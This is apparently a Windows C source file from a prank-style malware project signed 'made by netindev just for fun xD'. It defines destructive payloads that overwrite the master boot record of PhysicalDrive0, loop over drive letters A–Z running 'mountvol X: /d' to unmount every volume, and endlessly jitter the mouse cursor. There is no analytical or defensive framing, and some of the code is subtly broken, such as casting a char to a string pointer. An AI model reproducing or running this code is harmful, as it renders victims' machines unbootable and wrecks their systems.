#pragma once
#include "mbr.h"
#include <Windows.h>
#include "string.h"

void overwrite_mbr_payload()
{
	DWORD write;
	char mbrData[512];
	strcpy_s(mbrData, "made by netindev just for fun xD");
	HANDLE handle = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
			NULL, NULL);
	WriteFile(handle, mbrData, 512, &write, NULL);
	CloseHandle(handle);
}

void mountvol_payload()
{
	for (char c = 'A'; c <= 'Z'; ++c) {
		char command[50];
		strcpy_s(command, "mountvol ");
		strcat_s(command, (char*) c);
		strcat_s(command, ": /d");
		system(command);
	}
}

int randint(int n) {
	if ((n - 1) == RAND_MAX) {
		return rand();
	}
	else {
		int end = RAND_MAX / n;
		end *= n;
		int r;
		while ((r = rand()) >= end);
		return r % n;
	}
}

int get(LONG p)
{
	if (randint(100) >= 50) {
		return p - randint(5);
	}
	return p + randint(5);
}

void mouse_payload(int sleep)
{
	POINT p;
	if (GetCursorPos(&p))
	{
		while (true) {
			POINT p;
			GetCursorPos(&p);
			SetCursorPos(get(p.x), get(p.y));
			Sleep(sleep);
		}
	}
}
